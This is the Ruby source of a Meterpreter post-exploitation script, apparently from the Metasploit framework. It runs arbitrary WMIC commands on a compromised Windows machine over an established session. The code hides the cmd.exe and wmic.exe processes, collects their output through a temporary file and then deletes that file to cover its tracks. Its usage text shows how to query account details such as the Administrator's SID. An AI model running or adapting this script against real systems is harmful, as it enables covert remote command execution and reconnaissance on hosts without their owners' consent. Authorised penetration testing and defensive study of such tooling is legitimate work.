#Meterpreter script for running WMIC commands on Windows 2003, Windows Vista
# and Windows XP and Windows 2008 targets.
#Provided by Carlos Perez at carlos_perez[at]darkoperator[dot]com
################## Variable Declarations ##################
session = client
wininfo = client.sys.config.sysinfo
# Setting Arguments
@@exec_opts = Rex::Parser::Arguments.new(
  "-h" => [ false,"Help menu."                        ],
  "-c" => [ true,"Command to execute. The command must be enclosed in double quotes."],
  "-f" => [ true,"File where to saved output of command."],
  "-s" => [ true,"Text file with list of commands, one per line."]
)
#Setting Argument variables
commands = []
script = []
outfile = nil

################## Function Declarations ##################
# Function for running a list of WMIC commands stored in a array, returs string
def wmicexec(session,wmiccmds= nil)
  tmpout = ''
  session.response_timeout=120
  begin
    tmp = session.sys.config.getenv('TEMP')
    wmicfl = tmp + "\\"+ sprintf("%.5d",rand(100000))
    wmiccmds.each do |wmi|
      print_status "running command wmic #{wmi}"
      print_line wmicfl
      r = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe /append:#{wmicfl} #{wmi}", nil, {'Hidden' => true})
      sleep(2)
      #Making sure that wmic finishes before executing next wmic command
      prog2check = "wmic.exe"
      found = 0
      while found == 0
        session.sys.process.get_processes().each do |x|
          found =1
          if prog2check == (x['name'].downcase)
            sleep(0.5)
            found = 0
          end
        end
      end
      r.close
    end
    # Read the output file of the wmic commands
    wmioutfile = session.fs.file.new(wmicfl, "rb")
    until wmioutfile.eof?
      tmpout << wmioutfile.read
    end
    wmioutfile.close
  rescue ::Exception => e
    print_status("Error running WMIC commands: #{e.class} #{e}")
  end
  # We delete the file with the wmic command output.
  c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
  c.close
  tmpout
end
# Function for writing results of other functions to a file
def filewrt(file2wrt, data2wrt)
  output = ::File.open(file2wrt, "a")
  data2wrt.each_line do |d|
    output.puts(d)
  end
  output.close
end

#check for proper Meterpreter Platform
def unsupported
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end


def usage
  print_line("Windows WMIC Command Execution Meterpreter Script ")
  print_line @@exec_opts.usage
  print_line("USAGE:")
  print_line("run wmic -c \"WMIC Command Argument\"\n")
  print_line("NOTE:")
  print_line("Not all arguments for WMIC can be used, the /append: option is used by the script")
  print_line("for output retrieval. Arguments must be encased in double quotes and special characters escaped\n")
  print_line("Example:")
  print_line("run wmic -c \"useraccount where (name = \\\'Administrator\\\') get name, sid\"\n")
  raise Rex::Script::Completed
end

################## Main ##################
@@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-c"

    commands.concat(val.split("/"))

  when "-s"

    script = val
    if not ::File.exists?(script)
      raise "Command List File does not exists!"
    else
      ::File.open(script, "r").each_line do |line|
        next if line.strip.length < 1
        next if line[0,1] == "#"
        commands << line.chomp
      end
    end
  when "-f"

    outfile = val
  when "-h"
    usage
  else
    print_error "Unknown option: #{opt}"
    usage
  end

}

if args.length == 0
  usage
end
unsupported if client.platform !~ /win32|win64/i

if outfile == nil
  print_status wmicexec(session,commands)
else
  print_status("Saving output of WMIC to #{outfile}")
  filewrt(outfile, wmicexec(session,commands))
end
